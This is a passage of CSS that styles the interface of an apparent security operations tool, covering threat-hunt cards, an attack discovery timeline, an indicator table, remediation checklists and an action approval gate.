.hx-composer:focus-within{border-color:var(--blue);box-shadow:0 0 0 3px color-mix(in srgb,var(--blue) 14%,transparent)}
.hx-composer>svg{color:var(--ink-4);flex:0 0 auto}
.hx-input{flex:1;min-width:0;border:none;outline:none;background:transparent;font:inherit;font-size:13.5px;color:var(--ink-0)}
.hx-input::placeholder{color:var(--ink-4)}
.hx-go{appearance:none;border:none;flex:0 0 auto;display:inline-flex;align-items:center;gap:7px;background:var(--blue);color:#fff;border-radius:var(--r-sm);font:inherit;font-size:12.5px;font-weight:600;padding:8px 14px;cursor:pointer;transition:background .13s}
.hx-go:hover{background:var(--blue-d)}
.hx-go svg{color:#fff}
.hx-saved{display:flex;align-items:center;gap:7px;flex-wrap:wrap;margin:11px 2px 0}
.hx-saved .hxs-k{font-size:10.5px;font-weight:650;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4);margin-right:2px}
.hx-ski{margin:26px 0 0;background:linear-gradient(180deg,color-mix(in srgb,var(--violet) 8%,var(--panel)),var(--panel));border:1px solid color-mix(in srgb,var(--violet) 22%,var(--line));border-radius:var(--r-md);transition:border-color .14s,box-shadow .14s}
.hx-ski-top{display:flex;align-items:center;gap:12px;width:100%;padding:12px 14px;appearance:none;border:none;background:none;font:inherit;text-align:left;cursor:pointer}
.hx-ski-top:hover .hx-ski-go{text-decoration:underline}
.hx-ski-ic{flex:0 0 auto;width:32px;height:32px;border-radius:var(--r-sm);display:grid;place-items:center;background:color-mix(in srgb,var(--violet) 14%,transparent);color:var(--violet)}
.hx-ski-b{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}
.hx-ski-t{font-size:13px;font-weight:600;color:var(--ink-0)}
.hx-ski-m{font-size:11.5px;color:var(--ink-3)}
.hx-ski-go{flex:0 0 auto;display:inline-flex;align-items:center;gap:6px;font-size:11.5px;font-weight:600;color:var(--violet)}
.hx-ski-gaps{display:flex;align-items:center;gap:7px;flex-wrap:wrap;padding:10px 14px 12px;border-top:1px dashed color-mix(in srgb,var(--violet) 24%,var(--line))}
.hxg-k{font-size:10.5px;font-weight:650;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4);margin-right:3px}
.hxg-chip{appearance:none;display:inline-flex;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--line-2);border-radius:999px;padding:5px 11px;font:inherit;font-size:11.5px;font-weight:550;color:var(--ink-1);cursor:pointer;transition:all .13s;white-space:nowrap}
.hxg-chip:hover{border-color:color-mix(in srgb,var(--violet) 45%,var(--line));color:var(--ink-0)}
.hxg-chip code{font-family:var(--mono);font-size:10.5px;color:var(--ink-3)}
.hxg-dot{width:7px;height:7px;border-radius:50%;flex:0 0 auto}
.hxg-dot.none{background:var(--red)}
.hxg-dot.partial{background:var(--amber)}
.hunt-tabs{display:flex;gap:4px;margin-bottom:18px;border-bottom:1px solid var(--line)}
.hunt-tab{appearance:none;background:none;border:none;font:inherit;font-size:13px;font-weight:550;color:var(--ink-3);padding:8px 14px;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
.hunt-tab:hover{color:var(--ink-1)}
.hunt-tab.on{color:var(--blue-d);border-bottom-color:var(--blue)}
.hunt-lead{font-size:12.5px;color:var(--ink-3);line-height:1.55;margin-bottom:14px}
/* backlog sections + cards */
.hxsec{margin-top:26px}
.hxsec-h{display:flex;align-items:center;gap:8px;padding:0 2px 9px;border-bottom:1px solid var(--line);margin-bottom:12px}
.hxsec-dot{width:7px;height:7px;border-radius:50%;background:var(--grp);flex:0 0 auto}
.hxsec-l{font-size:11px;font-weight:600;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-3)}
.hxsec-n{font-family:var(--mono);font-size:10.5px;font-weight:600;color:var(--ink-3);background:var(--panel);border:1px solid var(--line-2);border-radius:999px;padding:1px 8px}
.hxsec-note{margin-left:auto;font-size:11px;color:var(--ink-4)}
.hx-row{padding:15px 16px 14px;margin:0 0 12px;border:1px solid color-mix(in srgb,var(--sev,var(--grp)) 16%,var(--line));border-radius:var(--r-md);background:linear-gradient(180deg,color-mix(in srgb,var(--sev,var(--grp)) 5%,var(--panel)),var(--panel) 130px);box-shadow:0 1px 2px rgba(20,23,28,.04);transition:border-color .14s,box-shadow .14s}
.hx-row:hover{border-color:color-mix(in srgb,var(--sev,var(--grp)) 32%,var(--line));box-shadow:0 2px 10px rgba(20,23,28,.07)}
.hx-row.hit{animation:hxHit 1.6s ease}
@keyframes hxHit{0%,30%{border-color:color-mix(in srgb,var(--sev,var(--grp)) 55%,var(--line));box-shadow:0 0 0 3px color-mix(in srgb,var(--sev,var(--grp)) 18%,transparent)}100%{box-shadow:0 1px 2px rgba(20,23,28,.04)}}
.hx-row-head{display:flex;align-items:center;gap:12px}
.hx-row-title{flex:1;min-width:0;font-size:13.5px;font-weight:600;color:var(--ink-0);letter-spacing:-.01em;line-height:1.35}
.hx-ttp{flex:0 0 auto;font-family:var(--mono);font-size:10.5px;color:var(--ink-4);background:var(--bg-2);border:1px solid var(--line);border-radius:999px;padding:3px 9px}
.hx-driver{appearance:none;border:none;background:none;font:inherit;display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:var(--ink-3);margin:5px 0 0 38px;padding:0;cursor:pointer;text-align:left;transition:color .12s}
.hx-driver svg{color:var(--violet);flex:0 0 auto}
.hx-driver:hover{color:var(--violet)}
.hx-hypo{margin:9px 0 0 38px;font-size:12.5px;line-height:1.6;color:var(--ink-1)}
.hx-hypo code{font-family:var(--mono);font-size:11px;background:var(--bg-2);border:1px solid var(--line);border-radius:4px;padding:1px 5px;color:var(--ink-0)}
.hx-meta{display:flex;flex-wrap:wrap;gap:6px;margin:11px 0 0 38px}
.hx-acts{display:flex;align-items:center;gap:7px;justify-content:flex-end;margin:12px 0 0 38px;padding-top:11px;border-top:1px dashed var(--line-2)}
.hx-runline{display:flex;align-items:center;gap:9px;margin:12px 0 0 38px;padding-top:11px;border-top:1px dashed var(--line-2);font-size:12px;color:var(--amber);font-weight:550}
.hx-done{display:flex;align-items:center;gap:8px;margin:12px 0 0 38px;padding-top:11px;border-top:1px dashed var(--line-2);font-size:12px;font-weight:600;color:var(--green,#1f8a5b)}
.hx-done svg{color:var(--green,#1f8a5b)}
.hx-done-sub{color:var(--ink-4);font-weight:500}
.hx-row .hbk-sse{margin:12px 0 0 38px}
/* ad-hoc hunt results */
.hx-adhoc{margin-top:14px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);overflow:hidden;box-shadow:0 1px 2px rgba(20,23,28,.04)}
.hx-adhoc-h{display:flex;align-items:center;gap:9px;padding:11px 14px;font-size:12.5px;color:var(--ink-2)}
.hx-adhoc-h b{color:var(--ink-0);font-weight:600}
.hx-adhoc-q{font-family:var(--mono);font-size:11px;color:var(--ink-2);background:var(--bg-2);border:1px solid var(--line);border-radius:999px;padding:3px 10px;max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.hx-adhoc-note{font-size:11px;color:var(--ink-4)}
.hx-adhoc-x{margin-left:auto;appearance:none;border:none;background:none;color:var(--ink-4);cursor:pointer;padding:5px;border-radius:6px;display:inline-flex}
.hx-adhoc-x:hover{background:var(--bg-2);color:var(--ink-1)}
.hx-adhoc .events-card{border:none;border-top:1px solid var(--line);border-radius:0;margin:0}
.hx-adhoc-f{display:flex;align-items:center;gap:8px;padding:11px 14px;border-top:1px dashed var(--line-2)}
.hx-adhoc-fnote{display:inline-flex;align-items:center;gap:7px;font-size:11.5px;color:var(--amber);font-weight:550;margin-right:auto}
/* security knowledge flyout */
.ski-mask{position:fixed;inset:0;background:rgba(72,89,117,.55);z-index:6000;animation:bdin .2s ease}
.ski-mask.out{animation:bdout .2s ease forwards;pointer-events:none}
.ski-fly{position:fixed;top:0;right:0;bottom:0;width:470px;max-width:94vw;background:var(--panel);z-index:6001;box-shadow:-24px 0 64px rgba(20,25,40,.25);display:flex;flex-direction:column;animation:skiSlide .26s var(--ease,cubic-bezier(.32,.72,0,1))}
@keyframes skiSlide{from{transform:translateX(44px);opacity:0}to{transform:none;opacity:1}}
.ski-fly.out{animation:skiOut .2s ease forwards;pointer-events:none}
@keyframes skiOut{to{transform:translateX(44px);opacity:0}}
.ski-fly-h{display:flex;align-items:center;gap:11px;padding:15px 18px;border-bottom:1px solid var(--line);flex:0 0 auto}
.ski-fly-ic{width:34px;height:34px;border-radius:var(--r-sm);background:color-mix(in srgb,var(--violet) 14%,transparent);color:var(--violet);display:grid;place-items:center;flex:0 0 auto}
.ski-fly-tw{flex:1;min-width:0}
.ski-fly-t{font-size:14.5px;font-weight:650;color:var(--ink-0);letter-spacing:-.01em}
.ski-fly-s{font-size:11.5px;color:var(--ink-3);margin-top:1px}
.ski-fly-refresh{flex:0 0 auto;display:inline-flex;align-items:center;gap:5px;font-size:11px;color:var(--ink-4)}
.ski-fly-x{flex:0 0 auto;appearance:none;border:none;background:none;color:var(--ink-4);cursor:pointer;padding:6px;border-radius:6px;display:inline-flex}
.ski-fly-x:hover{background:var(--bg-2);color:var(--ink-1)}
.ski-fly-body{flex:1;overflow:auto;padding:16px 18px 24px}
.ski-fly-body .ski-grid{grid-template-columns:1fr;gap:6px}
.ski-fly-note{margin-top:18px;padding:11px 13px;background:var(--bg-2);border-radius:var(--r-sm);font-size:11.5px;line-height:1.55;color:var(--ink-3);display:flex;gap:9px;align-items:flex-start}
.ski-fly-note svg{color:var(--violet);flex:0 0 auto;margin-top:1px}
.hunt-lead b{color:var(--ink-1)}
.ski-sech{display:flex;align-items:baseline;gap:8px;margin:4px 0 10px}
.ski-sech h3{font-size:13px;font-weight:600;color:var(--ink-1);margin:0}
.ski-sech .c{font-size:11px;color:var(--ink-4)}
.ski-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:20px}
.ski-card{display:flex;align-items:center;gap:11px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);padding:11px 13px}
.ski-ic{width:30px;height:30px;border-radius:var(--r-sm);background:var(--bg-2);display:grid;place-items:center;color:var(--ink-3);flex:0 0 auto}
.ski-b{flex:1;min-width:0}
.ski-n{font-size:12.5px;font-weight:550;color:var(--ink-1)}
.ski-m{font-size:11px;color:var(--ink-4);margin-top:1px}
.ski-kev{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:600;font-family:var(--mono);color:var(--red-d);background:var(--red-bg);border-radius:999px;padding:3px 9px;flex:0 0 auto}
.gap-row{display:flex;align-items:center;gap:10px;padding:9px 12px;border:1px solid var(--line);border-radius:var(--r-sm);background:var(--panel);margin-bottom:6px}
.gap-ttp{font-size:12px;color:var(--ink-1);flex:1;font-family:var(--mono)}
.gap-cov{font-size:10.5px;font-weight:600;border-radius:999px;padding:3px 9px}
.gap-cov.none{color:var(--red-d);background:var(--red-bg)}
.gap-cov.partial{color:var(--amber);background:var(--amber-bg)}
.gap-hunt{appearance:none;border:1px solid color-mix(in srgb,var(--blue) 32%,transparent);background:var(--panel);border-radius:var(--r-sm);font-family:inherit;font-size:11.5px;font-weight:600;color:var(--blue-d);padding:5px 10px;cursor:pointer;transition:all .13s;display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
.gap-hunt:hover{background:color-mix(in srgb,var(--blue) 18%,var(--panel));border-color:color-mix(in srgb,var(--blue) 50%,transparent)}
.hbk{display:flex;flex-direction:column;gap:10px}
.hbk-card{background:linear-gradient(180deg,color-mix(in srgb,var(--sev) 5%,var(--panel)),var(--panel));border:1px solid color-mix(in srgb,var(--sev) 16%,var(--line));border-radius:var(--r-md);padding:15px 17px}
.hbk-top{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px}
.hbk-score{flex:0 0 auto;min-width:26px;height:26px;padding:0 5px;border-radius:7px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;font-family:var(--mono);color:var(--sev);background:color-mix(in srgb,var(--sev) 12%,transparent)}
.hbk-head{flex:1;min-width:0;display:flex;flex-direction:column;gap:5px;padding-top:2px}
.hbk-titlerow{display:flex;align-items:flex-start;gap:10px}
.hbk-title{flex:1;font-size:14px;font-weight:600;color:var(--ink-0);letter-spacing:-.01em;line-height:1.35}
.hbk-ttp{flex:0 0 auto;font-size:10.5px;font-family:var(--mono);color:var(--ink-4);background:var(--bg-2);border:1px solid var(--line);border-radius:999px;padding:3px 9px;margin-top:1px}
.hbk-driver{display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:var(--ink-3)}
.hbk-driver svg{color:var(--violet);flex:0 0 auto}
.hbk-hypo{font-size:13px;color:var(--ink-1);line-height:1.6;margin-bottom:12px}
.hbk-hypo code{font-family:var(--mono);font-size:11.5px;background:var(--bg-2);border:1px solid var(--line);border-radius:4px;padding:1px 5px;color:var(--ink-0)}
.hbk-meta{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:13px}
.hbk-chip{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:500;color:var(--ink-2);background:var(--bg-2);border:1px solid var(--line);border-radius:999px;padding:4px 9px}
.hbk-chip svg{color:var(--ink-4)}
.hbk-chip-goal{color:var(--ink-1);background:var(--panel)}
.hbk-chip-goal svg{color:var(--accent)}
.hbk-acts{display:flex;gap:8px;align-items:center;border-top:1px dashed var(--line-2);padding-top:11px}
.hbk-run{appearance:none;border:1px solid color-mix(in srgb,var(--blue) 32%,transparent);background:var(--panel);color:var(--blue-d);border-radius:var(--r-sm);font-family:inherit;font-size:11.5px;font-weight:600;padding:5px 11px;cursor:pointer;transition:all .13s;display:inline-flex;align-items:center;gap:6px}
.hbk-run svg{color:var(--blue)}
.hbk-run:hover{background:color-mix(in srgb,var(--blue) 18%,var(--panel));border-color:color-mix(in srgb,var(--blue) 50%,transparent)}
.hbk-ghost{appearance:none;border:1px solid var(--line-2);background:var(--panel);border-radius:var(--r-sm);font-family:inherit;font-size:11.5px;font-weight:600;color:var(--ink-1);padding:5px 11px;cursor:pointer;transition:all .13s;display:inline-flex;align-items:center;gap:6px}
.hbk-ghost svg{color:var(--ink-3)}
.hbk-ghost:hover{border-color:var(--ink-4);background:var(--bg-2)}
.hbk-chat{color:var(--accent-d);border-color:color-mix(in srgb,var(--accent) 32%,transparent)}
.hbk-chat svg{color:var(--accent)}
.hbk-chat:hover{background:color-mix(in srgb,var(--accent) 16%,var(--panel));border-color:color-mix(in srgb,var(--accent) 50%,transparent)}
.hbk-running{display:inline-flex;align-items:center;gap:7px;font-size:12px;color:var(--amber);font-weight:500}
.hbk-sse{margin-top:11px;background:linear-gradient(180deg,color-mix(in srgb,var(--sev) 13%,var(--panel)),color-mix(in srgb,var(--sev) 6%,var(--panel)));border:1px solid color-mix(in srgb,var(--sev) 30%,var(--line));border-radius:var(--r-sm);padding:12px 13px}
.hbk-card.on-sse{border-color:color-mix(in srgb,var(--sev) 32%,var(--line))}
.hbk-sse .sse-h .sse-tag{color:var(--sev);background:color-mix(in srgb,var(--sev) 14%,var(--panel))}
.sse-card{background:linear-gradient(180deg,var(--amber-bg),var(--panel));border:1px solid color-mix(in srgb,var(--amber) 30%,var(--line));border-radius:var(--r-md);padding:14px 16px;margin-bottom:14px}
.sse-h{display:flex;align-items:center;gap:8px;font-size:12.5px;font-weight:600;color:var(--ink-0);margin-bottom:6px}
.sse-h .sse-tag{font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--amber);background:var(--amber-bg);border-radius:999px;padding:3px 9px}
.sse-body{font-size:12.5px;color:var(--ink-1);line-height:1.55;margin-bottom:10px}
.sse-acts{display:flex;gap:8px}
/* detection modal */
.det-mask{position:fixed;inset:0;background:rgba(72,89,117,.55);z-index:6000;display:flex;align-items:flex-start;justify-content:center;padding:48px 20px;overflow:auto}
.det-card{width:560px;max-width:100%;background:var(--panel);border-radius:var(--r-lg);box-shadow:var(--sh-lg,0 24px 64px rgba(20,23,28,.28));overflow:hidden}
.det-head{display:flex;align-items:center;gap:10px;padding:15px 18px;border-bottom:1px solid var(--line)}
.det-head .dh-ic{width:30px;height:30px;border-radius:var(--r-sm);background:var(--violet-bg);color:var(--violet);display:grid;place-items:center}
.det-head .dh-t{font-size:14px;font-weight:600;color:var(--ink-0);flex:1}
.det-head .dh-sub{font-size:12px;color:var(--ink-3);line-height:1.4;margin-top:1px}
.det-x{appearance:none;border:none;background:none;color:var(--ink-4);cursor:pointer;padding:4px}
.det-body{padding:16px 18px;max-height:62vh;overflow:auto}
.det-foot{display:flex;gap:8px;padding:13px 18px;border-top:1px solid var(--line);background:var(--bg)}
.det-foot .btn{appearance:none;border:none;border-radius:var(--r-sm);font:inherit;font-size:13px;font-weight:600;padding:9px 15px;cursor:pointer;display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
.det-foot .btn.go{background:var(--blue);color:#fff}
.det-foot .btn.go:hover{background:var(--blue-d)}
.det-foot .btn.ghost{background:var(--panel);border:1px solid var(--line-2);color:var(--ink-2);font-weight:500}
.det-foot .btn.ghost:hover{background:var(--bg-2)}
.det-perm{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--ink-3);margin-left:auto}
.det-perm svg{color:var(--ink-4)}
.perf-rejrow .rr-n2{display:none}
/* ===== Attack Discovery extension ===== */
.ad-lead{font-size:12.5px;color:var(--ink-3);line-height:1.55;margin-bottom:14px}
.ad-lead b{color:var(--ink-1)}
.ad-list{display:flex;flex-direction:column;gap:10px}
.ad-card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);padding:14px 16px;cursor:pointer;border-left:3px solid var(--sev,var(--red));transition:box-shadow .14s}
.ad-card:hover{box-shadow:var(--sh-sm,0 2px 8px rgba(20,23,28,.08))}
.ad-card-top{display:flex;align-items:center;gap:10px;margin-bottom:6px}
.ad-eyebrow{font-size:10px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4)}
.ad-score{font-size:13px;font-weight:700;font-family:var(--mono);color:var(--sev,var(--red));margin-left:auto}
.ad-title{font-size:14px;font-weight:600;color:var(--ink-0);margin-bottom:5px}
.ad-sum{font-size:12.5px;color:var(--ink-2);line-height:1.55;margin-bottom:9px}
.ad-ents{display:flex;flex-wrap:wrap;gap:6px}
.ad-ent{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;color:var(--ink-2);background:var(--bg-2);border-radius:999px;padding:3px 9px}
.ad-ent svg{color:var(--ink-4)}
.ad-back{appearance:none;border:none;background:none;font:inherit;font-size:12.5px;color:var(--ink-3);cursor:pointer;display:inline-flex;align-items:center;gap:6px;margin-bottom:14px;padding:0}
.ad-back:hover{color:var(--ink-1)}
.ad-detail-h{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}
.ad-detail-h .adh-b{flex:1}
.ad-src-tag{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;font-weight:600;color:var(--blue-d);background:var(--blue-bg);border-radius:999px;padding:4px 10px;margin-bottom:8px}
.ad-narr{font-size:13px;color:var(--ink-1);line-height:1.6}
.ad-sec{margin-top:18px}
.ad-sec h4{font-size:11px;font-weight:600;color:var(--ink-2);text-transform:none;letter-spacing:.01em;margin:0 0 9px;display:flex;align-items:center;gap:7px}
.ad-chain{display:flex;flex-direction:column;gap:0;border-left:2px solid var(--line);margin-left:5px;padding-left:0}
.ad-step{position:relative;padding:0 0 13px 18px}
.ad-step::before{content:'';position:absolute;left:-5px;top:3px;width:8px;height:8px;border-radius:50%;background:var(--red)}
.ad-step:last-child{padding-bottom:0}
.ad-step .as-t{font-size:11px;font-family:var(--mono);color:var(--ink-4)}
.ad-step .as-x{font-size:12.5px;color:var(--ink-1)}
.ad-cont{background:linear-gradient(180deg,var(--blue-bg),var(--panel));border:1px solid color-mix(in srgb,var(--blue) 22%,var(--line));border-radius:var(--r-md);padding:15px 16px;margin-top:20px}
.ad-cont-h{display:flex;align-items:center;gap:8px;font-size:12.5px;font-weight:600;color:var(--ink-0);margin-bottom:4px}
.ad-cont-sub{font-size:11.5px;color:var(--ink-3);margin-bottom:12px}
.ad-cont-btns{display:flex;flex-wrap:wrap;gap:8px}
.ad-cont-btn{appearance:none;background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-sm);font:inherit;font-size:12.5px;font-weight:550;color:var(--ink-1);padding:9px 13px;cursor:pointer;display:inline-flex;align-items:center;gap:7px;text-align:left}
.ad-cont-btn:hover{border-color:var(--blue);background:var(--blue-bg)}
.ad-cont-btn svg{color:var(--blue)}
.ad-cont-btn.on{border-color:var(--blue);background:var(--blue-bg);box-shadow:0 0 0 1px var(--blue) inset}
.ad-artifact{background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);padding:16px;margin-top:12px}
.ad-art-h{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;color:var(--ink-0);margin-bottom:10px}
.ad-art-h .tag{font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--blue-d);background:var(--blue-bg);border-radius:999px;padding:3px 8px;margin-left:auto}
.ad-art-body{font-size:12.5px;color:var(--ink-1);line-height:1.6}
.ad-list2{margin:8px 0 0;padding-left:18px;display:flex;flex-direction:column;gap:5px;font-size:12.5px;color:var(--ink-1)}
.ad-assume{display:flex;flex-direction:column;gap:7px;margin-top:4px}
.ad-assume-row{display:flex;gap:9px;align-items:flex-start;font-size:12px;color:var(--ink-2)}
.ad-assume-row .aa-ic{flex:0 0 auto;margin-top:1px}
.ad-assume-row.q .aa-ic{color:var(--amber)}
.ad-assume-row.a .aa-ic{color:var(--ink-4)}
.ad-art-acts{display:flex;gap:8px;margin-top:14px;border-top:1px dashed var(--line-2);padding-top:13px}
.ad-go{appearance:none;border:none;background:var(--blue);color:#fff;border-radius:var(--r-sm);font:inherit;font-size:12.5px;font-weight:600;padding:8px 14px;cursor:pointer;display:inline-flex;align-items:center;gap:6px}
.ad-go:hover{background:var(--blue-d)}
.ad-ghost{appearance:none;border:1px solid var(--line-2);background:var(--panel);border-radius:var(--r-sm);font:inherit;font-size:12px;font-weight:500;color:var(--ink-2);padding:8px 13px;cursor:pointer;display:inline-flex;align-items:center;gap:6px}
.ad-ghost:hover{background:var(--bg-2)}
/* ===== Deep Watch specialist workbench ===== */
.dw-lead{font-size:12.5px;color:var(--ink-3);line-height:1.55;margin-bottom:14px}
.dw-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start}
.dw-panel{background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);padding:15px 16px}
.dw-panel.full{grid-column:1 / -1}
.dw-ph{display:flex;align-items:center;gap:8px;font-size:12.5px;font-weight:600;color:var(--ink-0);margin-bottom:11px}
.dw-ph svg{color:var(--ink-3)}
.dw-ph .dw-tag{margin-left:auto;font-size:10px;font-weight:600;color:var(--ink-4);background:var(--bg-2);border-radius:999px;padding:3px 9px}
.dw-bundle{display:flex;flex-direction:column;gap:7px}
.dw-brow{display:flex;align-items:center;gap:9px;font-size:12px;color:var(--ink-1)}
.dw-brow .bk{width:96px;color:var(--ink-4);flex:0 0 auto}
.dw-brow .bv{font-family:var(--mono);color:var(--ink-1)}
.dw-req-btns{display:flex;flex-direction:column;gap:7px}
.dw-req{appearance:none;text-align:left;background:var(--bg-2);border:1px solid var(--line);border-radius:var(--r-sm);font:inherit;font-size:12px;color:var(--ink-1);padding:9px 11px;cursor:pointer;display:flex;align-items:center;gap:8px}
.dw-req:hover{border-color:var(--blue);background:var(--blue-bg)}
.dw-req svg{color:var(--violet)}
.dw-req .chev{margin-left:auto;color:var(--ink-4)}
.dw-req.done{color:var(--ink-4)}
.dw-req.done svg{color:var(--green)}
.dw-report h5{font-size:12px;font-weight:600;color:var(--ink-1);margin:12px 0 4px}
.dw-report h5:first-child{margin-top:0}
.dw-report p{font-size:12.5px;color:var(--ink-2);line-height:1.55;margin:0}
.dw-conf{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:600;border-radius:999px;padding:2px 8px;margin-left:6px}
.dw-conf.high{color:var(--green);background:var(--green-bg)}
.dw-conf.med{color:var(--amber);background:var(--amber-bg)}
.ioc-tbl{width:100%;border-collapse:collapse;font-size:11.5px}
.ioc-tbl th{text-align:left;font-weight:500;color:var(--ink-4);padding:5px 8px;border-bottom:1px solid var(--line);font-size:10.5px}
.ioc-tbl td{padding:6px 8px;border-bottom:1px solid var(--line);color:var(--ink-1);font-family:var(--mono)}
.ioc-tbl tr:last-child td{border-bottom:none}
.ioc-type{font-family:var(--font-family,inherit);font-size:10px;font-weight:600;color:var(--violet);background:var(--violet-bg);border-radius:999px;padding:2px 8px}
.rem-list{display:flex;flex-direction:column;gap:8px}
.rem-item{display:flex;gap:10px;align-items:flex-start;font-size:12.5px;color:var(--ink-1)}
.rem-cb{width:17px;height:17px;border-radius:5px;border:1.5px solid var(--line-2);flex:0 0 auto;margin-top:1px;display:grid;place-items:center;cursor:pointer;color:transparent}
.rem-cb.on{background:var(--green);border-color:var(--green);color:#fff}
.rem-item.on .rem-t{color:var(--ink-4);text-decoration:line-through}
.rem-owner{font-size:10.5px;color:var(--ink-4);margin-left:auto;flex:0 0 auto}
.dw-foot{display:flex;gap:8px;margin-top:14px;border-top:1px dashed var(--line-2);padding-top:13px}
/* ===== Flow 2 — approval sheet · resolved card · citations ===== */
.msg-full{margin:4px 0}
.gate{border:1px solid color-mix(in srgb,var(--red) 34%,var(--line));border-radius:var(--r-md);background:linear-gradient(180deg,var(--red-bg),var(--panel) 60%);box-shadow:var(--sh-sm);overflow:hidden;animation:radin .18s ease}
.gate-top{display:flex;align-items:center;gap:10px;padding:11px 14px;background:color-mix(in srgb,var(--red) 12%,var(--panel));border-bottom:1px solid color-mix(in srgb,var(--red) 20%,var(--line))}
.gate-ic{width:26px;height:26px;border-radius:7px;flex:0 0 auto;display:grid;place-items:center;background:var(--red);color:#fff}
.gate-ic svg{color:#fff}
.gate-h{flex:1;min-width:0}
.gate-k{font-size:9.5px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:var(--red-d)}
.gate-t{font-size:13.5px;font-weight:600;color:var(--ink-1);letter-spacing:-.01em}
.gate-id{font-family:var(--mono,ui-monospace,monospace);font-size:11px;color:var(--ink-4);flex:0 0 auto}
.gate-body{padding:12px 14px 8px}
.gate-lbl{font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-4);margin-bottom:8px}
.gate-blast{display:flex;flex-direction:column;gap:8px}
.gate-br{display:flex;align-items:flex-start;gap:9px;font-size:12.5px;line-height:1.45;color:var(--ink-1)}
.gate-br .gbi{flex:0 0 auto;color:var(--red-d);margin-top:1px}
.gate-br.ok .gbi{color:var(--green)}
.gate-br .gb-ok{margin-left:auto;flex:0 0 auto;font-size:11px;color:var(--green);display:inline-flex;align-items:center;gap:3px}
.gate-perm{display:flex;align-items:center;gap:7px;font-size:11.5px;color:var(--ink-3);padding:11px 0 2px;margin-top:10px;border-top:1px dashed var(--line-2)}
.gate-perm svg{color:var(--ink-4);flex:0 0 auto}
.gate-allow{display:flex;align-items:center;gap:9px;padding:10px 14px;font-size:12px;color:var(--ink-2);border-top:1px solid var(--line);background:color-mix(in srgb,var(--red) 4%,var(--panel))}
.gate-cb{width:17px;height:17px;border-radius:5px;border:1.5px solid var(--line-2);flex:0 0 auto;display:grid;place-items:center;cursor:pointer;color:transparent;transition:all .12s}
.gate-cb.on{background:var(--accent);border-color:var(--accent);color:var(--accent-on,#fff)}
.gate-acts{display:flex;gap:8px;padding:11px 14px 13px;background:var(--panel)}
.gate-yes{display:inline-flex;align-items:center;gap:6px;padding:9px 16px;border-radius:var(--r-sm);font-size:12.5px;font-weight:600;color:#fff;background:var(--red);border:none;cursor:pointer;font-family:inherit;transition:background .13s}
.gate-yes svg{color:#fff}
.gate-yes:hover{background:var(--red-d)}
.gate-no{padding:9px 14px;border-radius:var(--r-sm);font-size:12.5px;font-weight:550;color:var(--ink-2);background:none;border:1px solid var(--line-2);cursor:pointer;font-family:inherit}
.gate-no:hover{background:var(--bg-2)}
.rcard{border:1px solid color-mix(in srgb,var(--green) 30%,var(--line));border-radius:var(--r-md);background:linear-gradient(180deg,var(--green-bg),var(--panel) 58%);box-shadow:var(--sh-sm);overflow:hidden;animation:radin .2s ease}
.rcard-top{display:flex;align-items:center;gap:10px;padding:12px 14px 9px}
.rcard-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 11px;border-radius:999px;background:var(--green);color:#fff;font-size:11.5px;font-weight:600}
.rcard-badge svg{color:#fff}
.rcard-id{font-family:var(--mono,ui-monospace,monospace);font-size:11.5px;color:var(--ink-4)}
.rcard-stats{display:flex;padding:2px 14px 14px}
.rcard-stat{flex:1;min-width:0}
.rcard-stat + .rcard-stat{border-left:1px solid color-mix(in srgb,var(--green) 15%,var(--line));padding-left:13px}
.rcard-stat:not(:last-child){padding-right:13px}
.rcard-v{font-size:18px;font-weight:700;color:var(--ink-0);letter-spacing:-.02em;font-variant-numeric:tabular-nums}
.rcard-k{font-size:10.5px;color:var(--ink-3);margin-top:2px;line-height:1.3}
.rcard-foot{display:flex;align-items:center;gap:8px;padding:10px 14px;border-top:1px solid color-mix(in srgb,var(--green) 15%,var(--line));font-size:12px;line-height:1.45;color:var(--ink-2);background:var(--panel)}
.rcard-foot svg{color:var(--green);flex:0 0 auto}
.cite-tag{display:inline-flex;align-items:center;gap:5px;margin-top:9px;padding:4px 9px;border-radius:999px;background:var(--bg-2);border:1px solid var(--line);color:var(--ink-3);font-size:11px;font-weight:500;cursor:pointer;transition:all .12s;font-family:inherit}
.cite-tag:hover{border-color:var(--accent);color:var(--accent-d);background:var(--accent-bg)}
.cite-tag svg{color:var(--ink-4)}
.cite-tag:hover svg{color:var(--accent)}
.cite-tag .cite-src{font-family:var(--mono,ui-monospace,monospace);font-size:10.5px}
.cite-tag.sm{margin-top:0;padding:2px 8px;font-size:10.5px}
